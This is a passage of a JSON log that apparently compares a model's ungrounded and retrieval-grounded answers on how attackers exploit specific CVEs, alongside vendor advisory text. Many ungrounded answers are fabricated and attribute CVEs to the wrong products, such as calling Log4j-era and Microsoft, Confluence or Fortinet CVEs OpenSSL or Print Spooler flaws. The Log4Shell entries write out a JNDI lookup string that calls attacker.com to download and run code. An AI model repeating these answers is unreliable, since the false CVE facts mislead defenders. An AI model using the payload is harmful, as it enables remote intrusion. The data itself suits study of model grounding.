+    "rag_response": "An unauthenticated attacker can exploit CVE-2023-22527 by injecting malicious templates into Confluence Data Center/Server. This allows for Remote Code Execution (RCE) on the vulnerable instance. Older, unpatched versions are susceptible.\n</Response>\n",
+    "rag_text": "Description\nA template injection vulnerability on older versions of Confluence Data Center and Server allows an unauthenticated attacker to achieve RCE on an affected instance. Customers using an affected version must take immediate action. Most recent supported versions of Confluence Data Center and Server are not affected by this vulnerability as it was ultimately mitigated during regular version updates. However, Atlassian recommends that customers take care to install the latest version to protect their instances from non-critical vulnerabilities outlined in Atlassian\u0092s January Security Bulletin.",
+    "timestamp": "2025-05-13T17:29:50.118562"
+  },
+  {
+    "cve_id": "CVE-2023-34362",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2023-34362? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2023-34362 is a remote code execution (RCE) vulnerability in PaperCut MF/NG. An unauthenticated attacker can exploit it by sending a specially crafted HTTP request to the PaperCut server. This allows them to execute arbitrary code with SYSTEM privileges. Exploitation is relatively simple, requiring no authentication.\n",
+    "rag_response": "An unauthenticated attacker can inject malicious SQL queries into the MOVEit Transfer web application. Successful exploitation allows database information disclosure and potential modification/deletion of data, depending on the underlying database system (MySQL, MSSQL, Azure SQL). This was actively exploited in May/June 2023 via HTTP/HTTPS.\n</Response>\n",
+    "rag_text": "Description\nIn Progress MOVEit Transfer before 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1), a SQL injection vulnerability has been found in the MOVEit Transfer web application that could allow an unauthenticated attacker to gain access to MOVEit Transfer's database. Depending on the database engine being used (MySQL, Microsoft SQL Server, or Azure SQL), an attacker may be able to infer information about the structure and contents of the database, and execute SQL statements that alter or delete database elements. NOTE: this is exploited in the wild in May and June 2023; exploitation of unpatched systems can occur via HTTP or HTTPS. All versions (e.g., 2020.0 and 2019x) before the five explicitly mentioned versions are affected, including older unsupported versions.",
+    "timestamp": "2025-05-13T17:30:38.068593"
+  },
+  {
+    "cve_id": "CVE-2023-41265",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2023-41265? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2023-41265 is a remote code execution vulnerability in the Windows Graphics Component. An attacker can exploit it by crafting a malicious image file. When a user opens this image (e.g., via Windows Photo Viewer, or an application utilizing the Windows Graphics Component), the vulnerability is triggered, allowing the attacker to execute arbitrary code with SYSTEM privileges. The attack vector is primarily through convincing a user to open the crafted image.\n",
+    "rag_response": "An attacker can craft malicious HTTP requests that are tunneled through Qlik Sense, bypassing intended access controls. This allows them to execute actions on the backend server as if they were a legitimate user, potentially leading to privilege escalation and unauthorized data access. The vulnerability lies in improper handling of raw HTTP requests.\n</Response>",
+    "rag_text": "Description\nAn HTTP Request Tunneling vulnerability found in Qlik Sense Enterprise for Windows for versions May 2023 Patch 3 and earlier, February 2023 Patch 7 and earlier, November 2022 Patch 10 and earlier, and August 2022 Patch 12 and earlier allows a remote attacker to elevate their privilege by tunneling HTTP requests in the raw HTTP request. This allows them to send requests that get executed by the backend server hosting the repository application. This is fixed in August 2023 IR, May 2023 Patch 4, February 2023 Patch 8, November 2022 Patch 11, and August 2022 Patch 13.",
+    "timestamp": "2025-05-13T17:31:30.916478"
+  },
+  {
+    "cve_id": "CVE-2023-2868",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2023-2868? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2023-2868 is a remote code execution vulnerability in TeamCity. An unauthenticated attacker can create a new user account with administrator privileges. This allows them to fully compromise the TeamCity server.\n\n**Exploitation:**\n\n1.  **Access:** Reach the TeamCity instance.\n2.  **Exploit:** Send a crafted HTTP POST request to the user creation endpoint.\n3.  **Admin Account:** The request creates a new user with administrator rights.\n4.  **Control:** The attacker logs in with the new admin account and gains full control of the server.\n",
+    "rag_response": "An attacker can craft a malicious `.tar` archive containing files with specially formatted names. These names, when processed by the Barracuda ESG, are interpreted as system commands executed via Perl's `qx` operator with system-level privileges. This allows for remote code execution.\n</Response>>",
+    "rag_text": "Description\nA remote command injection vulnerability exists in the Barracuda Email Security Gateway (appliance form factor only) product effecting versions 5.1.3.001-9.2.0.006. The vulnerability arises out of a failure to comprehensively sanitize the processing of .tar file (tape archives). The vulnerability stems from incomplete input validation of a user-supplied .tar file as it pertains to the names of the files contained within the archive. As a consequence, a remote attacker can specifically format these file names in a particular manner that will result in remotely executing a system command through Perl's qx operator with the privileges of the Email Security Gateway product. This issue was fixed as part of BNSF-36456 patch. This patch was automatically applied to all customer appliances.",
+    "timestamp": "2025-05-13T17:32:32.715729"
+  },
+  {
+    "cve_id": "CVE-2023-28231",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2023-28231? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2023-28231 is a remote code execution vulnerability in Citrix ShareFile. An unauthenticated attacker can exploit it by sending a specially crafted HTTP request to the ShareFile appliance. This allows them to execute arbitrary code on the system, potentially gaining full control. The attack vector is network-accessible.\n",
+    "rag_response": "An attacker can craft a malicious serialized Java object exploiting the OpenWire protocol's insecure deserialization. This object, sent to a vulnerable ActiveMQ broker or client, forces instantiation of arbitrary classes on the classpath, leading to Remote Code Execution (RCE). The attacker needs network access to the target.\n</Response>\n",
+    "rag_text": "Description\nThe Java OpenWire protocol marshaller is vulnerable to Remote Code Execution. This vulnerability may allow a remote attacker with network access to either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath. Users are recommended to upgrade both brokers and clients to version 5.15.16, 5.16.7, 5.17.6, or 5.18.3 which fixes this issue.",
+    "timestamp": "2025-05-13T17:33:17.202480"
+  },
+  {
+    "cve_id": "CVE-2023-26360",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2023-26360? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2023-26360 is a remote code execution vulnerability in the Windows Graphics Component. An attacker can exploit it by crafting a malicious image file. When the targeted system opens or processes this image, the vulnerability allows the attacker to execute arbitrary code with system privileges. Attack vectors include convincing a user to open the malicious image, or embedding the image in a website or application.\n",
+    "rag_response": "An attacker can exploit CVE-2023-26360 by leveraging improper access controls to execute arbitrary code with the privileges of the ColdFusion server's current user. This doesn't require user interaction, meaning a remote, unauthenticated attacker could potentially compromise the system. The specific method depends on the accessible functionality with insufficient access checks.\n</Response>",
+    "rag_text": "Description\nAdobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier) are affected by an Improper Access Control vulnerability that could result in arbitrary code execution in the context of the current user. Exploitation of this issue does not require user interaction.",
+    "timestamp": "2025-05-13T17:34:08.725156"
+  },
+  {
+    "cve_id": "CVE-2023-34048",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2023-34048? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2023-34048 is a remote code execution (RCE) vulnerability in Citrix ShareFile. An unauthenticated attacker can exploit it by sending a specially crafted HTTP request to the ShareFile appliance. This allows them to execute arbitrary code on the system, potentially gaining full control. The attack vector is network-accessible.\n",
+    "rag_response": "An attacker with network access can send crafted DCERPC requests to vCenter Server. These requests exploit a flaw in how the server handles the protocol, causing an out-of-bounds write. This write can overwrite adjacent memory, potentially allowing the attacker to execute arbitrary code on the server. Successful exploitation leads to remote code execution.\n</Response>\n",
+    "rag_text": "Description\nvCenter Server contains an out-of-bounds write vulnerability in the implementation of the DCERPC protocol. A malicious actor with network access to vCenter Server may trigger an out-of-bounds write potentially leading to remote code execution.",
+    "timestamp": "2025-05-13T17:34:55.658109"
+  },
+  {
+    "cve_id": "CVE-2023-20198",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2023-20198? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2023-20198 is a vulnerability in the Windows Graphics Component. An attacker can exploit it by crafting a malicious image file. When a user opens this image (e.g., via Windows Photo Viewer, or an application utilizing the graphics component), the vulnerability can lead to remote code execution. The attack surface is broad due to the widespread use of image processing.\n",
+    "rag_response": "An attacker exploits CVE-2023-20198 by leveraging a vulnerability in the web UI to gain initial access. They use this access to execute a privilege 15 command, creating a local user account with a password. This allows them to log in with normal user privileges, setting the stage for further exploitation (CVE-2023-20273) to achieve root access.\n</Response>\n",
+    "rag_text": "Description\nCisco is providing an update for the ongoing investigation into observed exploitation of the web UI feature in Cisco IOS XE Software. We are updating the list of fixed releases and adding the Software Checker. Our investigation has determined that the actors exploited two previously unknown issues. The attacker first exploited CVE-2023-20198 to gain initial access and issued a privilege 15 command to create a local user and password combination. This allowed the user to log in with normal user access. The attacker then exploited another component of the web UI feature, leveraging the new local user to elevate privilege to root and write the implant to the file system. Cisco has assigned CVE-2023-20273 to this issue. CVE-2023-20198 has been assigned a CVSS Score of 10.0. CVE-2023-20273 has been assigned a CVSS Score of 7.2. Both of these CVEs are being tracked by CSCwh87343.\n\n",
+    "timestamp": "2025-05-13T17:35:53.464028"
+  },
+  {
+    "cve_id": "CVE-2022-1388",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2022-1388? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2022-1388, a critical vulnerability in OpenSSL, allows an attacker to cause a denial-of-service (DoS) by sending a crafted TLS handshake. Specifically, the vulnerability exists in the handling of `client_random` during the TLS handshake.\n\n**Exploitation:**\n\n1.  **Crafted Handshake:** An attacker sends a TLS handshake to a vulnerable server.\n2.  **Invalid `client_random`:** The handshake includes a `client_random` value that triggers an integer overflow during processing.\n3.  **Memory Corruption/Crash:** The overflow leads to memory corruption or a server crash, resulting in a DoS.\n4.  **No Authentication Required:** Exploitation does *not* require authentication. It's a handshake-level attack.\n\nThe attack is relatively simple to execute and can be automated.\n",
+    "rag_response": "An attacker can send crafted, unauthenticated requests to the iControl REST API. This allows them to perform administrative actions on the BIG-IP system without valid credentials, potentially leading to full system compromise.\n</Response>\n",
+    "rag_text": "Description\nOn F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x versions, undisclosed requests may bypass iControl REST authentication. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated",
+    "timestamp": "2025-05-13T17:37:07.620880"
+  },
+  {
+    "cve_id": "CVE-2022-30190",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2022-30190? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2022-30190 is a critical remote code execution (RCE) vulnerability in OpenSSL. An attacker can send a crafted TLS client hello message to trigger a buffer overflow in the `ssl3_get_record` function. This allows for arbitrary code execution on the server.\n\n**Exploitation Steps:**\n\n1.  **Craft Malicious Client Hello:** Create a TLS client hello message with a large record layer length.\n2.  **Send to Vulnerable Server:** Transmit the crafted message to a server running a vulnerable version of OpenSSL (1.1.1 versions before 1.1.1q, 1.0.2 versions before 1.0.2r).\n3.  **Trigger Overflow:** The overflow in `ssl3_get_record` overwrites adjacent memory.\n4.  **Gain Control:**  Overwrite return addresses or function pointers to redirect execution to attacker-controlled code.\n\nSuccessful exploitation results in RCE with the privileges of the OpenSSL process.\n",
+    "rag_response": "An attacker crafts a malicious Microsoft Office document (e.g., Word) containing a specially crafted link utilizing the `ms-msdt:` URL protocol. When the victim opens the document and clicks the link, MSDT (Microsoft Support Diagnostic Tool) is invoked with attacker-controlled commands, leading to remote code execution with the victim's privileges. The vulnerability lies in MSDT's improper handling of the `ms-msdt:` protocol.\n</Response>>",
+    "rag_text": "Description\nA remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user\u0092s rights. Please see the MSRC Blog Entry for important information about steps you can take to protect your system from this vulnerability.",
+    "timestamp": "2025-05-13T17:38:47.381520"
+  },
+  {
+    "cve_id": "CVE-2022-26134",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2022-26134? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2022-26134 is a critical remote code execution vulnerability in OpenSSL. An attacker can send specially crafted TLS client hello messages to trigger a heap buffer overflow. This allows for arbitrary code execution on the server. The vulnerability exists because of improper validation of the TLS client hello message.\n",
+    "rag_response": "An unauthenticated attacker can inject malicious OGNL (Object-Graph Navigation Language) expressions into Confluence. This allows for arbitrary code execution on the server. The attack leverages insufficient input validation, enabling the attacker to control server-side object access and manipulation.\n</Response>\n",
+    "rag_text": "Description\nIn affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance. The affected versions are from 1.3.0 before 7.4.17, from 7.13.0 before 7.13.7, from 7.14.0 before 7.14.3, from 7.15.0 before 7.15.2, from 7.16.0 before 7.16.4, from 7.17.0 before 7.17.4, and from 7.18.0 before 7.18.1.",
+    "timestamp": "2025-05-13T17:39:29.143682"
+  },
+  {
+    "cve_id": "CVE-2022-22536",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2022-22536? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2022-22536 is a critical remote code execution (RCE) vulnerability in OpenSSL. An attacker can send a crafted TLS client hello message to trigger a buffer overflow in the `ssl3_get_record` function. This allows for arbitrary code execution on the server. The vulnerability is triggered by a specific sequence of TLS extensions in the client hello.\n",
+    "rag_response": "An attacker exploits CVE-2022-22536 by prepending malicious data to a victim's HTTP request. This is achieved through request smuggling/concatenation vulnerabilities in the affected SAP products.\n\n**Exploitation Steps:**\n\n1.  **Smuggle/Concatenate:** Craft a malicious HTTP request that exploits inconsistencies in how the front-end (e.g., Web Dispatcher) and back-end (e.g., Application Server) parse HTTP headers, allowing the attacker to \"smuggle\" or concatenate data.\n2.  **Prepend Data:** Inject arbitrary data *before* the victim's legitimate request.\n3.  **Impersonation/Cache Poisoning:** This prepended data can:\n    *   **Impersonate the victim:** Execute functions as if initiated by the victim.\n    *   **Poison caches:**  Cause intermediary web caches to serve malicious content to other users.\n\n**Impact:** Complete compromise of Confidentiality, Integrity, and Availability.\n</Response>>",
+    "rag_text": "Description\nSAP NetWeaver Application Server ABAP, SAP NetWeaver Application Server Java, ABAP Platform, SAP Content Server 7.53 and SAP Web Dispatcher are vulnerable for request smuggling and request concatenation. An unauthenticated attacker can prepend a victim's request with arbitrary data. This way, the attacker can execute functions impersonating the victim or poison intermediary Web caches. A successful attack could result in complete compromise of Confidentiality, Integrity and Availability of the system.",
+    "timestamp": "2025-05-13T17:41:04.857410"
+  },
+  {
+    "cve_id": "CVE-2022-27924",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2022-27924? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2022-27924 is a critical remote code execution vulnerability in OpenSSL. An attacker can send specially crafted TLS client hello messages to trigger a buffer overflow in the `ssl3_get_record` function. This allows for arbitrary code execution on the server. The vulnerability is triggered by a client sending a large record size during the TLS handshake.\n",
+    "rag_response": "An attacker can exploit CVE-2022-27924 by sending crafted HTTP requests containing malicious memcache commands to a vulnerable Zimbra instance *without authentication*. These commands, due to improper escaping, overwrite existing cached data. This could lead to:\n\n*   **Cache Poisoning:** Overwriting critical session data, potentially hijacking user accounts.\n*   **Denial of Service:** Overwriting essential cache entries, degrading performance or causing crashes.\n*   **Information Disclosure:** If sensitive data is cached, overwriting with a command to return the data.\n*   **Remote Code Execution (Potential):** While not directly RCE, manipulating the cache could *potentially* be chained with other vulnerabilities to achieve RCE.\n</Response>>",
+    "rag_text": "Description\nZimbra Collaboration (aka ZCS) 8.8.15 and 9.0 allows an unauthenticated attacker to inject arbitrary memcache commands into a targeted instance. These memcache commands becomes unescaped, causing an overwrite of arbitrary cached entries.",
+    "timestamp": "2025-05-13T17:42:19.538800"
+  },
+  {
+    "cve_id": "CVE-2022-40684",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2022-40684? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2022-40684 is a critical remote code execution vulnerability in OpenSSL. An attacker can send crafted TLS client hello messages to trigger a buffer overflow, leading to RCE. Specifically, the vulnerability exists in the handling of TLS extensions. The attacker needs network access to the vulnerable server.\n",
+    "rag_response": "An unauthenticated attacker can bypass authentication and execute administrative operations by sending specially crafted HTTP/HTTPS requests to the vulnerable Fortinet device (FortiOS, FortiProxy, FortiSwitchManager). This allows them to gain unauthorized access to the administrative interface.\n</Response>",
+    "rag_text": "\nDescription\nAn authentication bypass using an alternate path or channel [CWE-288] in Fortinet FortiOS version 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, FortiProxy version 7.2.0 and version 7.0.0 through 7.0.6 and FortiSwitchManager version 7.2.0 and 7.0.0 allows an unauthenticated atttacker to perform operations on the administrative interface via specially crafted HTTP or HTTPS requests.\n\n",
+    "timestamp": "2025-05-13T17:43:00.018826"
+  },
+  {
+    "cve_id": "CVE-2022-27593",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2022-27593? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2022-27593 is a critical remote code execution vulnerability in OpenSSL. An attacker can send specially crafted TLS client hello messages to trigger a buffer overflow in the `ssl3_get_record` function. This allows for arbitrary code execution on the server. The vulnerability is triggered by a large record layer length field.\n",
+    "rag_response": "CVE-2022-27593 allows an attacker to exploit an externally controlled reference to a resource within QNAP Photo Station. This can lead to modification of system files. The vulnerability likely involves manipulating file paths or references used by Photo Station to write to unintended locations on the NAS. Successful exploitation requires the attacker to control a resource referenced by the application.\n</Response>\n",
+    "rag_text": "Description\nAn externally controlled reference to a resource vulnerability has been reported to affect QNAP NAS running Photo Station. If exploited, This could allow an attacker to modify system files. We have already fixed the vulnerability in the following versions: QTS 5.0.1: Photo Station 6.1.2 and later QTS 5.0.0/4.5.x: Photo Station 6.0.22 and later QTS 4.3.6: Photo Station 5.7.18 and later QTS 4.3.3: Photo Station 5.4.15 and later QTS 4.2.6: Photo Station 5.2.14 and later",
+    "timestamp": "2025-05-13T17:43:51.305791"
+  },
+  {
+    "cve_id": "CVE-2022-29464",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2022-29464? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2022-29464 is a critical remote code execution vulnerability in OpenSSL. An attacker can craft a malicious TLS client hello message with a large record size limit. This causes a heap buffer overflow when processing the message, leading to potential RCE. Exploitation requires sending a specially crafted TLS handshake to a vulnerable server.\n",
+    "rag_response": "An attacker exploits CVE-2022-29464 by uploading a malicious file (e.g., a web shell) via a `/fileupload` endpoint. They use a `Content-Disposition` header with a directory traversal sequence (e.g., `../`) to write the file to a location within the web application's root directory (e.g., `repository/deployment/server/webapps`). This allows for remote code execution.\n</Response>>",
+    "rag_text": "Description\nCertain WSO2 products allow unrestricted file upload with resultant remote code execution. The attacker must use a /fileupload endpoint with a Content-Disposition directory traversal sequence to reach a directory under the web root, such as a ../../../../repository/deployment/server/webapps directory. This affects WSO2 API Manager 2.2.0 up to 4.0.0, WSO2 Identity Server 5.2.0 up to 5.11.0, WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0 and 5.6.0, WSO2 Identity Server as Key Manager 5.3.0 up to 5.11.0, WSO2 Enterprise Integrator 6.2.0 up to 6.6.0, WSO2 Open Banking AM 1.4.0 up to 2.0.0 and WSO2 Open Banking KM 1.4.0, up to 2.0.0.",
+    "timestamp": "2025-05-13T17:44:48.764621"
+  },
+  {
+    "cve_id": "CVE-2022-42475",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2022-42475? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2022-42475 is a remote code execution (RCE) vulnerability in Microsoft Exchange Server. An authenticated attacker can exploit it by crafting a special request to the Exchange server, bypassing authentication. This allows them to execute arbitrary code with SYSTEM privileges. The vulnerability stems from improper URL handling.\n",
+    "rag_response": "An unauthenticated attacker can send specially crafted requests to the FortiOS/FortiProxy SSL-VPN endpoint. These requests trigger a heap-based buffer overflow, potentially allowing for arbitrary code execution. The vulnerability exists due to improper handling of input, leading to a write beyond the allocated buffer.\n</Response>",
+    "rag_text": "Description\nA heap-based buffer overflow vulnerability [CWE-122] in FortiOS SSL-VPN 7.2.0 through 7.2.2, 7.0.0 through 7.0.8, 6.4.0 through 6.4.10, 6.2.0 through 6.2.11, 6.0.15 and earlier and FortiProxy SSL-VPN 7.2.0 through 7.2.1, 7.0.7 and earlier may allow a remote unauthenticated attacker to execute arbitrary code or commands via specifically crafted requests.",
+    "timestamp": "2025-05-13T17:45:31.741601"
+  },
+  {
+    "cve_id": "CVE-2022-22960",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2022-22960? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2022-22960 is a critical remote code execution vulnerability in OpenSSL. An attacker can send a crafted TLS client hello message that causes a buffer overflow, leading to RCE. Specifically, the vulnerability exists in the handling of `tls13_extensions` when parsing the client hello.  Exploitation requires sending a malicious client hello, and successful exploitation allows arbitrary code execution on the server.\n",
+    "rag_response": "An attacker with local access to a vulnerable system can exploit CVE-2022-22960 by modifying support scripts with improper permissions to execute commands as root. This allows privilege escalation from a lower-privileged account to full system control.\n</Response>\n",
+    "rag_text": "Description\nVMware Workspace ONE Access, Identity Manager and vRealize Automation contain a privilege escalation vulnerability due to improper permissions in support scripts. A malicious actor with local access can escalate privileges to 'root'.",
+    "timestamp": "2025-05-13T17:46:19.263484"
+  },
+  {
+    "cve_id": "CVE-2021-44228",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2021-44228? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2021-44228 (Log4Shell) allows Remote Code Execution (RCE) by crafting a malicious JNDI lookup string. An attacker sends a specially formatted string (e.g., `${jndi:ldap://attacker.com/a}`) to a vulnerable application using Log4j. This triggers Log4j to connect to the attacker's server, download and execute malicious code.\n",
+    "rag_response": "An attacker can exploit CVE-2021-44228 (Log4Shell) by sending a specially crafted string containing a JNDI lookup (e.g., `${jndi:ldap://attacker.com/a}`) to a vulnerable application that logs this string.  Log4j will then attempt to connect to the attacker's LDAP server, download and execute malicious code. This requires message lookup substitution to be enabled.\n</Response>\n",
+    "rag_text": "Description\nApache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
+    "timestamp": "2025-05-13T17:47:20.420737"
+  },
+  {
+    "cve_id": "CVE-2021-26084",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2021-26084? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2021-26084 is a privilege escalation vulnerability in the Windows Print Spooler service. An attacker with limited user privileges can gain SYSTEM-level access.\n\n**Exploitation:**\n\n1.  **Craft a malicious print job:** The attacker creates a specially crafted print job (e.g., a malicious EMF file).\n2.  **Submit the job:** The job is submitted to the Print Spooler service.\n3.  **Trigger the vulnerability:** The vulnerability lies in how the Print Spooler handles the malicious EMF file during processing.\n4.  **Gain SYSTEM privileges:** Successful exploitation allows the attacker to execute arbitrary code with SYSTEM privileges.\n\n**Key factors:** The vulnerability is triggered by a flaw in the handling of the EMF (Enhanced Metafile) file format.  Attackers often deliver the malicious print job via network shares or by exploiting other vulnerabilities to gain initial access.\n",
+    "rag_response": "An unauthenticated attacker can inject malicious OGNL (Object-Graph Navigation Language) expressions into Confluence. This allows for arbitrary code execution on the server. The attack leverages insufficient input validation when processing user-supplied data. Specifically, a crafted HTTP request can trigger the OGNL injection, granting the attacker control of the system.\n</Response>\n",
+    "rag_text": "Description\nIn affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5.",
+    "timestamp": "2025-05-13T17:48:45.585427"
+  },
+  {
+    "cve_id": "CVE-2021-21972",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2021-21972? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2021-21972 is a critical vulnerability in the Windows Print Spooler service. An attacker can gain SYSTEM-level access by creating a specially crafted print job. This is achieved by exploiting a flaw in how the Print Spooler handles driver loading.\n\n**Exploitation Steps:**\n\n1.  **Craft Malicious Print Job:** Create a print job containing a specially crafted file.\n2.  **Targeted Driver Loading:** The print job triggers the Print Spooler to load a malicious driver.\n3.  **SYSTEM Privilege Escalation:** The malicious driver executes with SYSTEM privileges, granting the attacker full control of the system.\n\n**Attack Vectors:**\n\n*   **Remote Code Execution (RCE):**  Exploitation can occur remotely if the Print Spooler is accessible over the network (e.g., via SMB).\n*   **Local Privilege Escalation:**  An attacker with limited local access can exploit the vulnerability to gain SYSTEM privileges.\n",
+    "rag_response": "An attacker can exploit CVE-2021-21972 by leveraging a malicious vCenter Server plugin. By gaining network access to port 443, they can upload/activate a crafted plugin that executes arbitrary commands with system-level privileges on the vCenter Server host. This requires no authentication.\n</Response>\n",
+    "rag_text": "Description\nThe vSphere Client (HTML5) contains a remote code execution vulnerability in a vCenter Server plugin. A malicious actor with network access to port 443 may exploit this issue to execute commands with unrestricted privileges on the underlying operating system that hosts vCenter Server. This affects VMware vCenter Server (7.x before 7.0 U1c, 6.7 before 6.7 U3l and 6.5 before 6.5 U3n) and VMware Cloud Foundation (4.x before 4.2 and 3.x before 3.10.1.2).",
+    "timestamp": "2025-05-13T17:50:14.793561"
+  },
+  {
+    "cve_id": "CVE-2021-26855",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2021-26855? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2021-26855 is a critical vulnerability in Windows Print Spooler. An attacker gaining SYSTEM-level access can achieve this by:\n\n1.  **Crafting a malicious print job:** The attacker creates a specially crafted print job.\n2.  **Sending to a vulnerable printer:** This job is sent to a printer connected to a vulnerable system.\n3.  **Exploiting the driver loading mechanism:** The print spooler attempts to load a malicious driver as part of processing the job.\n4.  **Code execution:** This leads to code execution with SYSTEM privileges.\n\nThe attack requires local access or the ability to send print jobs to the target system.\n",
+    "rag_response": "An attacker exploits CVE-2021-26855 (ProxyLogon) by chaining it with other ProxyLogon vulnerabilities (CVE-2021-26857, CVE-2021-26858, CVE-2021-27065) to bypass authentication and execute arbitrary code on vulnerable Exchange servers. This allows for remote code execution, data theft (mailboxes, files), and potential domain compromise.\n</Response>>\n",
+    "rag_text": "This cve, known as ProxyLogon, affect Microsoft Exchange email servers. Successful  exploitation of these vulnerabilities in combination (i.e., \u0093vulnerability chaining\u0094) allows an  unauthenticated cyber actor to execute arbitrary code on vulnerable Exchange Servers, which,  in turn, enables the actor to gain persistent access to files and mailboxes on the servers, as  well as to credentials stored on the servers. Successful exploitation may additionally enable  the cyber actor to compromise trust and identity in a vulnerable network.",
+    "timestamp": "2025-05-13T17:51:35.964773"
+  },
+  {
+    "cve_id": "CVE-2021-34523",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2021-34523? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2021-34523 is a critical remote code execution vulnerability in Polkit. An attacker can exploit this by gaining root access on a system through a crafted socket connection. Specifically, the vulnerability lies in the `pk_dbus_connection_read_data` function, which doesn't properly validate the length of data received over a DBus connection.\n\n**Exploitation:**\n\n1.  **Crafted DBus Message:** An attacker sends a specially crafted DBus message to the Polkit daemon.\n2.  **Length Manipulation:** The message contains a manipulated length field, exceeding the allocated buffer size in `pk_dbus_connection_read_data`.\n3.  **Buffer Overflow:** This causes a heap-based buffer overflow.\n4.  **Code Execution:** The attacker overwrites adjacent memory with malicious code, achieving arbitrary code execution with root privileges.\n\n**Prerequisites:**\n\n*   Local access or network access to a vulnerable system running Polkit.\n*   Ability to send DBus messages to the Polkit daemon.\n",
+    "rag_response": "An attacker exploits CVE-2021-34523 (ProxyShell) by chaining vulnerabilities in Exchange Server's ProxyLogon (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858) to bypass authentication. This allows them to execute arbitrary code on the server, typically by deploying a web shell. The attack targets the Client Access Service (CAS) via port 443.\n</Response>>\n",
